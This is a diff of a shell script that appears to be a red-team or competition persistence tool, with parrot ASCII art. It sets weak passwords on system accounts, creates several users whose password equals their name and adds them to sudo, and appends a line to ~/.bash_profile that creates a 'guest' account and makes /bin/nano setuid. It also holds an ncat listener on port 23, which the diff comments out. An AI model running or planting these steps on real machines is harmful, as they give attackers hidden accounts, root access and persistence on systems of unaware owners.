@@ -1,6 +1,3 @@
-#var tmp/
-cd /tmp/
-
 #make parrot file
 cat > cyberparrots.txt << "EOF"
             .------.
@@ -40,19 +37,30 @@ echo 'daemon:password1' | chpasswd
 echo 'sys:password1' | chpasswd
 echo 'games:password1' | chpasswd
 
-useradd joe && echo "joe:joe" | chpasswd
-useradd matthew && echo "matthew:matthew" | chpasswd
-useradd ben && echo "ben:ben" | chpasswd
-useradd silas && echo "silas:silas" | chpasswd
-useradd stubblefield && echo "stubblefield:stubblefield" | chpasswd
-useradd cyberparrot && echo "cyberparrot:cyberparrot" | chpasswd
-
+useradd joe 
+echo 'joe:joe' | chpasswd
 usermod -aG sudo joe
+
+useradd matthew
+echo 'matthew:matthew' | chpasswd
 usermod -aG sudo matthew
+
+useradd ben
+echo 'ben:ben' | chpasswd
 usermod -aG sudo ben
+
+useradd silas 
+echo 'silas:silas' | chpasswd
 usermod -aG sudo silas
+
+useradd stubblefield
+echo 'stubblefield:stubblefield' | chpasswd
 usermod -aG sudo stubblefield
+
+useradd cyberparrot
+echo 'cyberparrot:cyberparrot' | chpasswd
 usermod -aG sudo cyberparrot
+
 
 #start bash persistence with guest user
 sudo echo "useradd guest && echo 'guest:guest' | chpasswd && chmod u+s /bin/nano" >> ~/.bash_profile
@@ -60,7 +68,7 @@ sudo echo "useradd guest && echo 'guest:guest' | chpasswd && chmod u+s /bin/nano
 
 
 #netcat
-ncat --tcp -lvp 23
+##ncat --tcp -lvp 23
 
 
 #crontab ?????
